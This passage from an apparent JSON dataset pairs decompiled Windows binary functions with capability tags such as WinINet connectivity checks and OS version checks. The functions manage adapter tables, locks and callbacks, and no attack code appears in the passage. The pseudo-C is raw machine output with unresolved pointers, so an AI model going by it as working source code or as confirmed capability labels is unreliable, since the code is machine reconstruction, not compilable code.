        "decompiled_code": "\nvoid __cdecl fcn.00050b90(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (arg_8h != 0) {\n        iVar2 = *(arg_8h + 8);\n        if ((*(iVar2 + 0xe8) != 0) && (*(iVar2 + 0xe8) == -0x4e3e23b0)) {\n            *(iVar2 + 0xe8) = *(iVar2 + 0x168);\n        }\n        if (((*(iVar2 + 0x164) != 0) && (cVar1 = fcn.00050f10(*(iVar2 + 0xd8), iVar2),  cVar1 != '\\0')) &&\n           (*(iVar2 + 0x164) == -0x4e3e2240)) {\n            *(iVar2 + 0x164) = *(iVar2 + 0x174);\n        }\n        if ((*0xb1c5b70c != 0) && (iVar2 = fcn.000635f0(0xb1c5b708),  iVar2 == 0)) {\n            *0xb1c5b70c = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 287
    },
    "00050c50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.00050c50(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    pcVar1 = *(arg_8h + 0x168);\n    var_10h = 0;\n    for (var_8h = 0; var_8h < arg_10h; var_8h = var_8h + 1) {\n        iVar2 = *(*(arg_ch + var_8h * 4) + 8);\n        if (*0x10 != 0x10) {\n            if ((*(iVar2 + 6) & 5) == 0) {\n                var_20h = (**0xb1bde224)(iVar2, 0);\n            }\n            else {\n                var_20h = *(iVar2 + 0xc);\n            }\n            var_ch = var_20h;\n        }\n        cVar3 = fcn.0004f1b0(arg_8h, 0, 0, 0, var_ch, *(iVar2 + 0x14), 0);\n        if (cVar3 == '\\0') {\n            *(*(arg_ch + var_8h * 4) + 0x38) = 0;\n        }\n        else {\n            *(*(arg_ch + var_8h * 4) + 0x38) = 1;\n            var_10h = var_10h + 1;\n        }\n    }\n    if (var_10h == arg_10h) {\n        (*pcVar1)(arg_8h, arg_ch, arg_10h);\n    }\n    else {\n        for (var_8h = 0; var_8h < arg_10h; var_8h = var_8h + 1) {\n            if (*(*(arg_ch + var_8h * 4) + 0x38) == '\\x01') {\n                (*pcVar1)(arg_8h, arg_ch + var_8h * 4, 1);\n            }\n            else if (*(*(arg_ch + var_8h * 4) + 0x1c + *(*(arg_ch + var_8h * 4) + 0x1e)) != -0x3fffff66) {\n                fcn.00051080(arg_8h, *(arg_ch + var_8h * 4));\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 727
    },
    "00050f70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00050f70(uint8_t *arg_8h)\n\n{\n    uint var_ch;\n    uint32_t var_8h;\n    uint8_t *var_4h;\n    \n    if (*0xb1c4640c == 0xffffffff) {\n        var_4h = arg_8h;\n        for (var_8h = 0; var_8h < 0x80; var_8h = var_8h + 1) {\n            if ((((2 < *var_4h) && (*var_4h < 7)) && ((var_4h[1] == 0 || (var_4h[1] == 1)))) && (*(var_4h + 4) == 0)) {\n                *0xb1c4640c = var_8h;\n                break;\n            }\n            var_4h = var_4h + 1;\n        }\n        if (*0xb1c4640c == 0xffffffff) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 236
    },
    "00051010": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00051010(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *(arg_8h + 0x2c);\n    arg_ch = arg_ch + 0x10;\n    uVar2 = uVar1;\n    if (((*(arg_8h + 0x24) != 0) && (arg_ch != 0)) && (uVar2 = fcn.00078712(*(arg_8h + 0x24), arg_ch, 1),  uVar2 == 0))\n    {\n        return 1;\n    }\n    if (((uVar1 != 0) && (arg_ch != 0)) && (uVar2 = fcn.00078712(uVar1, arg_ch, 1),  uVar2 == 0)) {\n        return 1;\n    }\n    return uVar2 & 0xffffff00;\n}\n",
        "token_count": 241
    },
    "00051080": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00051080(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *(arg_8h + 8);\n    if (((*0xb1c4640c != -1) || (cVar1 = fcn.00050f70(iVar2),  cVar1 != '\\0')) &&\n       ((iVar2 = iVar2 + *0xb1c4640c,  *(arg_ch + 0x1c + *(arg_ch + 0x1e)) != 0 || (*(iVar2 + 0x3c) != 0)))) {\n        (**(iVar2 + 0x3c))(*(arg_8h + 0xc), arg_ch);\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "00051140": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00051140(int32_t *arg_8h, int32_t *arg_ch, int32_t *arg_10h, int32_t *arg_14h, int32_t *arg_18h)\n\n{\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_14h != NULL) {\n        *arg_14h = arg_8h[2];\n    }\n    if (((arg_18h != NULL) || (arg_10h != NULL)) || (arg_ch != NULL)) {\n        if (*(arg_8h + 7) == '\\0') {\n            var_1ch = arg_8h[2];\n            var_ch = 0;\n            var_10h = 0;\n            var_14h = 0;\n            for (; var_1ch != NULL; var_1ch = *var_1ch) {\n                var_ch = var_ch + var_1ch[5];\n                if (var_1ch[5] == 0) {\n                    var_2ch = 1;\n                }\n                else {\n                    var_2ch = (var_1ch[4] + var_1ch[6] & 0xfff) + 0xfff + var_1ch[5] >> 0xc;\n                }\n                var_10h = var_10h + var_2ch;\n                var_14h = var_14h + 1;\n            }\n            arg_8h[5] = var_14h;\n            arg_8h[1] = var_ch;\n            *arg_8h = var_10h;\n            *(arg_8h + 7) = 1;\n        }\n        if (arg_ch != NULL) {\n            *arg_ch = *arg_8h;\n        }\n        if (arg_10h != NULL) {\n            *arg_10h = arg_8h[5];\n        }\n        if (arg_18h != NULL) {\n            *arg_18h = arg_8h[1];\n        }\n    }\n    return;\n}\n",
        "token_count": 526
    },
    "00051280": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00051280(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    iVar1 = fcn.00051fb0(arg_8h, 0, 0x1010102, &var_10h, 6);\n    fcn.00037150(0xb1c5b4c0, &var_4h, 1);\n    var_8h = fcn.0003da90(arg_8h, 1);\n    if ((var_8h != 0) && (*(var_8h + 8) == 0)) {\n        if (iVar1 == 0) {\n            *(var_8h + 0x10) = var_10h;\n            *(var_8h + 0x14) = var_ch;\n        }\n        else {\n            *(var_8h + 0x10) = 0;\n            *(var_8h + 0x14) = 0;\n        }\n    }\n    fcn.00037180(0xb1c5b4c0, &var_4h, 1);\n    return iVar1;\n}\n",
        "token_count": 315
    },
    "00051360": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00051360(void)\n\n{\n    int32_t var_7ch;\n    uint var_78h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_4h;\n    \n    fcn.000348f0(0xb1be18ec, 0xb1c5a780, 0xb1c5a784);\n    fcn.00078790(&var_78h, 0, 0x6c);\n    var_78h._0_1_ = 5;\n    var_78h._1_1_ = 0;\n    var_70h = 0xb1c1ee50;\n    var_6ch = 0xb1c1ef40;\n    var_68h = 0xb1c1e7b0;\n    var_64h = 0xb1c1f590;\n    var_60h = 0xb1c1f650;\n    var_5ch = 0xb1c1f0b0;\n    var_58h = 0xb1c1f0e0;\n    var_54h = 0xb1c1f660;\n    var_50h = 0xb1c1f670;\n    var_4ch = 0xb1c1f660;\n    fcn.00078550(&var_48h, 0xb1be258c);\n    var_3ch = 0xb1c1f680;\n    var_38h = 0xb1c1f690;\n    var_34h = 0xb1c1f6f0;\n    (**0xb1bde02c)(&var_4h, 0xb1c5b710, &var_78h, 0x6c);\n    var_7ch = var_4h;\n    if (var_4h == 0) {\n        (**0xb1bde01c)(&var_4h, 0xb1c5b718, 100, 0xc);\n        if (var_4h == 0) {\n            (**0xb1bde068)(&var_4h, 0xb1c5b714, 100);\n            if (var_4h == 0) {\n                var_7ch = fcn.000517f0();\n                if (var_7ch == 0) {\n                    *0xb1c5b347 = 1;\n                    var_7ch = 0;\n                }\n            }\n            else {\n                var_7ch = var_4h;\n            }\n        }\n        else {\n            var_7ch = var_4h;\n        }\n        if (var_7ch != 0) {\n            if (*0xb1c5b718 != 0) {\n                (**0xb1bde058)(*0xb1c5b718);\n            }\n            if (*0xb1c5b714 != 0) {\n                (**0xb1bde06c)(*0xb1c5b714);\n            }\n            (**0xb1bde028)(&var_4h, *0xb1c5b710);\n        }\n    }\n    return var_7ch;\n}\n",
        "token_count": 801
    },
    "000514d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.000514d0(void)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    if (*0xb1c5b347 != '\\0') {\n        *0xb1c5b347 = '\\0';\n        for (var_8h = 0; var_8h < 100; var_8h = var_8h + 1) {\n            iVar1 = fcn.0003d630(var_8h, &var_4h);\n            if ((iVar1 == 0) && (var_4h == 0)) {\n                fcn.00051e80(var_8h);\n            }\n        }\n        (**0xb1bde028)(&var_ch, *0xb1c5b710);\n        (**0xb1bde058)(*0xb1c5b718);\n        (**0xb1bde06c)(*0xb1c5b714);\n    }\n    return;\n}\n",
        "token_count": 226
    },
    "00051560": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00051560(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t **var_20h;\n    int32_t var_1ch;\n    int32_t **var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    var_1ch = 0;\n    var_18h = NULL;\n    if (*0xb1c5b347 == '\\0') {\n        var_ch = -0x3fffffff;\n    }\n    else {\n        var_ch = fcn.00051b90(arg_8h);\n        if (var_ch == 0) {\n            fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n            var_10h = fcn.0003da90(arg_8h, 1);\n            if (((var_10h == 0) || (*(var_10h + 8) != 0)) || (*(var_10h + 0x430) == 0)) {\n                fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n                var_ch = -0x3ffffff2;\n            }\n            else if ((*0xb1c5a780 == 0) ||\n                    ((*0xb1c5a780 <= *(*(var_10h + 0x430) + 0x54) &&\n                     (*(*(var_10h + 0x430) + 0x54) < *0xb1c5a780 + *0xb1c5a784)))) {\n                var_14h = *(var_10h + 0x430);\n                fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n                if (var_14h == 0) {\n                    var_ch = -0x3ffffddb;\n                }\n                else {\n                    (**0xb1bde024)(&var_8h, &var_18h, *0xb1c5b714, arg_ch, arg_10h);\n                    if (var_8h == 0) {\n                        (**0xb1bde05c)(&var_8h, &var_1ch, *0xb1c5b718);\n                        if (var_8h == 0) {\n                            *(var_1ch + 0x38) = 0;\n                            fcn.00033ff0(var_1ch + 0x3c);\n                            for (var_20h = var_18h; *var_20h != NULL; var_20h = *var_20h) {\n                            }\n                            if (*(var_1ch + 8) == 0) {\n                                *(var_1ch + 0xc) = var_20h;\n                            }\n                            *var_20h = *(var_1ch + 8);\n                            *(var_1ch + 8) = var_18h;\n                            *(var_1ch + 0x1c) = 0;\n                            (**(var_14h + 0x54))(var_14h, &var_1ch, 1);\n                            fcn.000340e0(var_1ch + 0x3c, 0xffffffff);\n                            var_ch = *(var_1ch + 0x1c + *(var_1ch + 0x1e));\n                        }\n                        else {\n                            var_ch = var_8h;\n                            fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n                        }\n                    }\n                    else {\n                        var_ch = var_8h;\n                        fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n                    }\n                    if (var_18h != NULL) {\n                        (**0xb1bde2ac)(var_18h);\n                    }\n                    if (var_1ch != 0) {\n                        fcn.00034080(var_1ch + 0x3c);\n                        (**0xb1bde060)(var_1ch);\n                    }\n                }\n            }\n            else {\n                fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n                var_ch = -0x3fffffff;\n            }\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 1009
    },
    "000517f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.000517f0(void)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    fcn.0003d7b0(0xb1be259c);\n    fcn.0003d7b0(0xb1be25b0);\n    for (var_4h = 0; var_4h < 100; var_4h = var_4h + 1) {\n        iVar1 = fcn.0003da90(var_4h, 0);\n        if (iVar1 != 0) {\n            fcn.00051850(var_4h, 1);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 165
    },
    "00051850": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00051850(uint arg_8h, int32_t arg_ch)\n\n{\n    int16_t iVar1;\n    uint var_528h;\n    uint var_520h;\n    int16_t *var_51ch;\n    uint var_518h;\n    uint var_31ah;\n    uint32_t var_314h;\n    int32_t var_310h;\n    int32_t var_30ch;\n    uint var_308h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_108h._0_1_ = 0;\n    fcn.00078790(&var_108h + 1, 0, 0xff);\n    var_308h._0_2_ = 0;\n    fcn.00078790(&var_308h + 2, 0, 0x1fe);\n    var_518h._0_2_ = 0;\n    fcn.00078790(&var_518h + 2, 0, 0x1fe);\n    var_314h = 0;\n    fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n    var_30ch = fcn.0003da90(arg_8h, 1);\n    if (((var_30ch == 0) || (*(var_30ch + 0x216) == 0x24)) || (*(var_30ch + 8) != 0)) {\n        fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n        var_310h = 0;\n    }\n    else {\n        fcn.00033ff0(var_30ch + 0x438);\n        var_51ch = var_30ch + 0x216;\n        do {\n            iVar1 = *var_51ch;\n            var_51ch = var_51ch + 1;\n        } while (iVar1 != 0);\n        if (var_51ch - (var_30ch + 0x218) >> 1 == 0) {\n            fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n            var_310h = -0x3fffffff;\n        }\n        else {\n            *(var_30ch + 0x44c) = 0xffffffff;\n            *(var_30ch + 0x420) = 9;\n            fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n            var_310h = fcn.00051b90(arg_8h);\n            if ((var_310h == 0) && (arg_ch != 0)) {\n                var_310h = fcn.00051fb0(arg_8h, 0, 0x1010d, &var_108h, 0x100);\n                if (var_310h != 0) {\n                    return var_310h;\n                }\n                fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n                var_30ch = fcn.0003da90(arg_8h, 1);\n                if (var_30ch != 0) {\n                    fcn.00078592(&var_518h, var_30ch + 0x16, 0x100);\n                    var_31ah._0_2_ = 0;\n                    var_314h = *(var_30ch + 0x216) == 0x7b;\n                }\n                fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n                if (var_30ch == 0) {\n                    return var_310h;\n                }\n                if (var_314h == 0) {\n                    fcn.00078556(&var_308h, 0x100, 0xb1bde644, &var_108h);\n                }\n                else {\n                    fcn.00078556(&var_308h, 0x100, 0xb1be25c4, &var_108h, &var_518h);\n                }\n                fcn.00037150(0xb1c5b4c0, &var_4h, 1);\n                var_30ch = fcn.0003da90(arg_8h, 1);\n                if (var_30ch != 0) {\n                    fcn.00078592(var_30ch + 0x216, &var_308h, 0x100);\n                    *(var_30ch + 0x414) = 0;\n                }\n                fcn.00037180(0xb1c5b4c0, &var_4h, 1);\n            }\n            var_310h = 0;\n        }\n    }\n    return var_310h;\n}\n",
        "token_count": 1109
    },
    "00051b90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00051b90(uint arg_8h)\n\n{\n    int16_t iVar1;\n    uint var_244h;\n    uint *var_240h;\n    int16_t *var_23ch;\n    uint var_238h;\n    int32_t var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    fcn.00037150(0xb1c5b4c0, &var_8h, 0);\n    var_10h = fcn.0003da90(arg_8h, 1);\n    if ((var_10h == 0) || (*(var_10h + 8) != 0)) {\n        fcn.00037180(0xb1c5b4c0, &var_8h, 0);\n        var_230h = -0x3fffffff;\n    }\n    else {\n        var_23ch = var_10h + 0x16;\n        var_240h = &var_220h;\n        do {\n            iVar1 = *var_23ch;\n            *var_240h = iVar1;\n            var_23ch = var_23ch + 1;\n            var_240h = var_240h + 2;\n        } while (iVar1 != 0);\n        var_228h = *(var_10h + 0x438);\n        fcn.00037180(0xb1c5b4c0, &var_8h, 0);\n        fcn.00078550(&var_238h, &var_220h);\n        (**0xb1bde040)(&var_230h, &var_22ch, &var_ch, &var_224h, 0xb1c57d00, 2, *0xb1c5b710, var_10h, &var_238h, 0, 0);\n        if (var_230h == 0x103) {\n            fcn.000340e0(&var_228h, 0xffffffff);\n            var_230h = *(var_10h + 0x43c);\n        }\n        if (var_230h == 0) {\n            fcn.00037150(0xb1c5b4c0, &var_8h, 1);\n            var_10h = fcn.0003da90(arg_8h, 1);\n            if (var_10h != 0) {\n                *(var_10h + 0x430) = var_ch;\n                *(var_10h + 0x434) = var_224h;\n                *(var_10h + 0x444) = 0;\n                var_4h = *(var_10h + 0x420);\n            }\n            fcn.00037180(0xb1c5b4c0, &var_8h, 1);\n            if (var_10h == 0) {\n                var_230h = -0x3ffffddb;\n            }\n            else {\n                var_230h = fcn.00051fb0(arg_8h, 1, 0x1010e, &var_4h, 4);\n                var_230h = fcn.00051fb0(arg_8h, 0, 0x1010102, &var_1ch, 6);\n                fcn.00037150(0xb1c5b4c0, &var_8h, 1);\n                var_10h = fcn.0003da90(arg_8h, 1);\n                if (var_10h == 0) {\n                    var_ch = 0;\n                }\n                else {\n                    if (var_230h == 0) {\n                        *(var_10h + 0x10) = var_1ch;\n                        *(var_10h + 0x14) = var_18h;\n                    }\n                    else {\n                        *(var_10h + 0x10) = 0;\n                        *(var_10h + 0x14) = 0;\n                    }\n                    var_ch = *(var_10h + 0x430);\n                    var_14h = *(var_10h + 0x448);\n                }\n                fcn.00037180(0xb1c5b4c0, &var_8h, 1);\n                fcn.00050a80(var_ch, var_14h);\n                var_230h = 0;\n            }\n        }\n    }\n    return var_230h;\n}\n",
        "token_count": 1087
    },
    "00051e80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00051e80(uint arg_8h)\n\n{\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n    var_8h = fcn.0003da90(arg_8h, 1);\n    if (var_8h == 0) {\n        fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n    }\n    else {\n        fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n        fcn.00050b90(*(var_8h + 0x430));\n        *(var_8h + 0x440) = 0;\n        (**0xb1bde070)(&var_ch, *(var_8h + 0x430));\n        if (var_ch == 0x103) {\n            fcn.000340e0(var_8h + 0x438, 0xffffffff);\n        }\n        fcn.00034080(var_8h + 0x438);\n        fcn.0003d6b0(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 294
    },
    "00051f40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00051f40(int32_t arg_8h, uint arg_ch)\n\n{\n    uint var_4h;\n    \n    *(arg_8h + 0x430) = 0;\n    if (*(arg_8h + 0x440) == 0) {\n        *(arg_8h + 0x43c) = arg_ch;\n        fcn.000340b0(arg_8h + 0x438);\n    }\n    else {\n        (**0xb1bde020)(*(arg_8h + 0x440), arg_ch);\n        *(arg_8h + 0x444) = 1;\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "00051fb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00051fb0(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t *arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    int32_t var_68h;\n    int32_t var_64h;\n    int32_t *var_60h;\n    uint var_5ch;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_80h = 0;\n    fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n    var_ch = fcn.0003da90(arg_8h, 1);\n    if (var_ch != 0) {\n        if (((arg_ch == 1) && (arg_10h == 0x1010e)) && (*(var_ch + 0x448) != 0)) {\n            var_8h = *arg_14h;\n            if (var_8h != 0) {\n                var_8h = 1;\n            }\n            arg_14h = &var_8h;\n        }\n        var_80h = *(var_ch + 0x430);\n    }\n    fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n    if (var_80h == 0) {\n        var_7ch = -0x3ffffddb;\n    }\n    else {\n        iVar1 = fcn.00033ff0(&var_18h);\n        if (iVar1 == 0) {\n            var_7ch = -0x3fffffff;\n        }\n        else {\n            var_68h = arg_ch;\n            var_64h = arg_10h;\n            var_60h = arg_14h;\n            var_5ch = arg_18h;\n            fcn.0007876c(&var_7ch, var_80h, &var_78h);\n            if (var_7ch == 0x103) {\n                fcn.000340e0(&var_18h, 0xffffffff);\n                fcn.00034080(&var_18h);\n                var_7ch = var_1ch;\n            }\n        }\n    }\n    return var_7ch;\n}\n",
        "token_count": 563
    },
    "000520e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.000520e0(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint32_t arg_1ch, \n            uint32_t arg_20h)\n\n{\n    int16_t iVar1;\n    uint32_t arg_8h_00;\n    char cVar2;\n    int16_t iVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = *(arg_8h + 4);\n    if ((arg_8h_00 != 0) && (arg_8h_00 < 0x65)) {\n        fcn.00057030(0);\n        if (arg_14h == 0xe) {\n            fcn.0004d370(arg_8h_00, arg_10h, arg_18h, arg_1ch);\n        }\n        fcn.00037150(arg_8h + 0x424, &var_4h, 0);\n        if (*(arg_8h + 0x418) == 0) {\n            var_8h = 0;\n        }\n        else {\n            var_8h = fcn.00064580(*(arg_8h + 0x418));\n        }\n        fcn.00037180(arg_8h + 0x424, &var_4h, 0);\n        if (var_8h == 0) {\n            if ((arg_14h == 0xe) && (iVar1 = *(arg_10h + 0xc),  iVar3 = fcn.000354c0(0x7ff),  iVar1 == iVar3)) {\n                var_8h = 1;\n            }\n        }\n        else {\n            fcn.00057060(0);\n        }\n        if (var_8h != 0) {\n            if (arg_1ch < arg_20h) {\n                cVar2 = fcn.00052250(*(arg_8h + 0x430), arg_ch, arg_10h, arg_14h, arg_20h);\n                if (cVar2 == '\\0') {\n                    fcn.000524f0(*(arg_8h + 0x430), arg_10h, arg_14h, arg_18h, arg_1ch);\n                }\n            }\n            else {\n                fcn.000524f0(*(arg_8h + 0x430), arg_10h, arg_14h, arg_18h, arg_1ch);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 606
    },
    "00052250": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00052250(int32_t arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint32_t uVar1;\n    int32_t **var_20h;\n    int32_t var_1ch;\n    int32_t **var_18h;\n    uint32_t var_11h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_18h = NULL;\n    var_1ch = 0;\n    var_11h._0_1_ = 0;\n    uVar1 = fcn.00035230(arg_14h + arg_18h);\n    unique0x1000018a = uVar1;\n    if ((uVar1 != 0) && (uVar1 = (**0xb1bde024)(&var_ch, &var_4h, *0xb1c5b714, uVar1, arg_14h),  var_ch == 0)) {\n        fcn.0007877e(stack0xffffffec, arg_10h, arg_14h);\n        